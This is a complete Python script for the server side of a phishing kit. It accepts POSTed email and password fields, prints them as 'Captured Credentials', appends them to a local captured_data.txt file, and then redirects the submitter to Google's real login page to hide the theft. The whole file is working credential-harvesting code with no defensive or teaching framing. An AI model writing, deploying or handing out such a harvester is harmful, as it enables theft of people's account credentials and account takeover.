import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Read content length and parse form data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()

            # Parse the form data
            form_data = parse_qs(post_data)
            email = form_data.get('email', [''])[0]
            password = form_data.get('password', [''])[0]

            # Print the captured credentials to the terminal
            print(f"Captured Credentials -> Email: {email}, Password: {password}")

            # Write credentials to a file
            file_path = os.path.join(os.path.dirname(__file__), "captured_data.txt")
            with open(file_path, "a") as f:
                f.write(f"Email: {email}\nPassword: {password}\n\n")

            # Respond and redirect the user
            self.send_response(302)
            self.send_header('Access-Control-Allow-Origin', '*')  # Allow cross-origin requests
            self.send_header('Location', 'https://accounts.google.com/')  # Redirect to Google after submission
            self.end_headers()
        except Exception as e:
            print(f"Error capturing data: {e}")
            self.send_response(500)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8081):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server running on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()